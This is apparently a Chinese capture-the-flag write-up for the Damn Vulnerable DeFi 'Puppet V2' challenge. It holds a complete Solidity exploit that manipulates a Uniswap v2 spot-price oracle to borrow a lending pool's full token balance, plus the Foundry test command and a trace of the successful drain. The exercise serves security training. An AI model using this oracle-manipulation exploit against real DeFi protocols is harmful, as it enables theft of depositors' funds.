## 题目 [Puppet V2](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/puppet-v2)

上一版池子的开发者似乎吸取了教训，发布了一个新版本。  

现在，他们使用了一个 Uniswap v2 交易所作为价格预言机，并且采用了推荐的实用程序库。这样难道还不够吗？  

你从 20 ETH 和 10000 DVT 代币的余额开始。池子里有 100万 DVT 代币的余额，处于风险之中！  

把池子里的所有资金存入指定的恢复账户，确保安全。  

## 合约分析
`PuppetV2Pool` 是一个借贷合约，它允许你存入 ether 来借贷出 DVT，和上题不同的时候，比率从 2 倍改成了 3 倍，DVT 和 ether 的交易对放在了 uniswapV2 上面。但是漏洞还是相同的，获取价格是直接取当时的块内 pair 合约余额的比值得到的价格，所以价格还是可以用相同方式操控。

## 题解
1. 由于池子比较薄（10 ether : 100 DVT），我们把 10000 DVT 全部卖出，此时 DVT 价格暴跌。
2. 用 ether 抵押借贷出 pool 池中所有的 DVT 。

POC：
``` solidity
contract PuppetV2Exploit {
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Router02 uniswapV2Router;
    PuppetV2Pool lendingPool;
    address recovery;

    constructor(WETH _weth, DamnValuableToken _token, IUniswapV2Router02 _uniswapV2Router, PuppetV2Pool _lendingPool, address _recovery) payable {
        weth = _weth;
        token = _token;
        uniswapV2Router = _uniswapV2Router;
        lendingPool = _lendingPool;
        recovery = _recovery;

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    }

    function attack() public {
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp);

        uint256 ethRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        require(address(this).balance > ethRequired);

        weth.deposit{value:ethRequired}();
        weth.approve(address(lendingPool), ethRequired);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable {}

}

...
    function test_puppetV2() public checkSolvedByPlayer {
        PuppetV2Exploit puppetV2Exploit = new PuppetV2Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(weth, token, uniswapV2Router, lendingPool, recovery);
        token.transfer(address(puppetV2Exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        puppetV2Exploit.attack();
    }
...

```
运行测试：
```
forge test --mp test/puppet-v2/PuppetV2.t.sol -vvvv
```
测试结果：
```
[PASS] test_puppetV2() (gas: 645873)
Traces:
  [777673] PuppetV2Challenge::test_puppetV2()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [411839] → new PuppetV2Exploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   ├─ [24523] DamnValuableToken::approve(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 10000000000000000000000 [1e22])
    │   │   ├─ emit Approval(owner: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 10000000000000000000000 [1e22])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 1364 bytes of code
    ├─ [29674] DamnValuableToken::transfer(PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 10000000000000000000000 [1e22])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 10000000000000000000000 [1e22])
    │   └─ ← [Return] true
    ├─ [282672] PuppetV2Exploit::attack()
    │   ├─ [99298] 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50::swapExactTokensForETH(10000000000000000000000 [1e22], 0, [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b, 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1)
    │   │   ├─ [2504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 10000000000000000000 [1e19], 100000000000000000000 [1e20], 1
    │   │   ├─ [8528] DamnValuableToken::transferFrom(PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 10000000000000000000000 [1e22])
    │   │   │   ├─ emit Transfer(from: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 10000000000000000000000 [1e22])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [54131] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(9900695134061569016 [9.9e18], 0, 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 0x)
    │   │   │   ├─ [29663] WETH::transfer(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 9900695134061569016 [9.9e18])
    │   │   │   │   ├─ emit Transfer(from: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 9900695134061569016 [9.9e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [542] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   │   └─ ← [Return] 99304865938430984 [9.93e16]
    │   │   │   ├─ [519] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   │   └─ ← [Return] 10100000000000000000000 [1.01e22]
    │   │   │   ├─ emit Sync(reserve0: 99304865938430984 [9.93e16], reserve1: 10100000000000000000000 [1.01e22])
    │   │   │   ├─ emit Swap(sender: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount0In: 0, amount1In: 10000000000000000000000 [1e22], amount0Out: 9900695134061569016 [9.9e18], amount1Out: 0, to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [15985] WETH::withdraw(9900695134061569016 [9.9e18])
    │   │   │   ├─ emit Transfer(from: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, to: 0x0000000000000000000000000000000000000000, amount: 9900695134061569016 [9.9e18])
    │   │   │   ├─ emit Withdrawal(to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 9900695134061569016 [9.9e18])
    │   │   │   ├─ [83] 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50::fallback{value: 9900695134061569016}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [55] PuppetV2Exploit::receive{value: 9900695134061569016}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] [10000000000000000000000 [1e22], 9900695134061569016 [9.9e18]]
    │   ├─ [9436] PuppetV2Pool::calculateDepositOfWETHRequired(1000000000000000000000000 [1e24]) [staticcall]
    │   │   ├─ [504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 99304865938430984 [9.93e16], 10100000000000000000000 [1.01e22], 1
    │   │   └─ ← [Return] 29496494833197321980 [2.949e19]
    │   ├─ [25972] WETH::deposit{value: 29496494833197321980}()
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 29496494833197321980 [2.949e19])
    │   │   ├─ emit Deposit(who: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 29496494833197321980 [2.949e19])
    │   │   └─ ← [Stop] 
    │   ├─ [24546] WETH::approve(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], 29496494833197321980 [2.949e19])
    │   │   ├─ emit Approval(owner: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], amount: 29496494833197321980 [2.949e19])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [82078] PuppetV2Pool::borrow(1000000000000000000000000 [1e24])
    │   │   ├─ [504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 99304865938430984 [9.93e16], 10100000000000000000000 [1.01e22], 1
    │   │   ├─ [25617] WETH::transferFrom(PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], 29496494833197321980 [2.949e19])
    │   │   │   ├─ emit Transfer(from: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], amount: 29496494833197321980 [2.949e19])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [27674] DamnValuableToken::transfer(PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], to: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000000 [1e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Borrowed(borrower: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], depositRequired: 29496494833197321980 [2.949e19], borrowAmount: 1000000000000000000000000 [1e24], timestamp: 1)
    │   │   └─ ← [Stop] 
    │   ├─ [24874] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   │   ├─ emit Transfer(from: PuppetV2Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Lending pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.52ms (1.82ms CPU time)

```

